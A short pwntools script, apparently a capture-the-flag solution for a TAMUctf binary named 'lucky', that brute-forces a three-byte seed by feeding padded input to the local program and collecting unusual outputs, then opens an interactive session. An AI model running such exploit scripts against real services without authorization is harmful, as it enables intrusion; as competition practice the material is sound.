from pwn import *

#p = remote("tamuctf.com", 443, ssl=True, sni="lucky")
#context.log_level = 'debug'
context.arch = "amd64"
context.terminal=['tmux','split','-h']
#p = process('./lucky', env={'LD_PRELOAD': '../libc-2.23.so'})
e = ELF('./lucky')
libc = ELF("../libc-2.23.so")

sla	= lambda a,b: p.sendlineafter(a,b)
sa 	= lambda a,b: p.sendafter(a,b)
ra 	= lambda a: p.readuntil(a)

#gdb.attach(p)
import time

low = 0
high = 100

lst = []

for a in range(low, high + 1):
    for b in range(low, high + 1):
        for c in range(low, high + 1):
            p = process('./lucky', env={'LD_PRELOAD': '../libc-2.23.so'})
            seed = chr(a) + chr(b) + chr(c)
            print(seed)
            sla("name:", b'0'*12 + str.encode(seed) +b'0'*1)
            out = p.recvline()
            print(out)
            if len(out) > 5:
                
                lst.append(out)
            time.sleep(0.3)

print(lst)
print("-----------------------------------------------------------")
p.interactive()
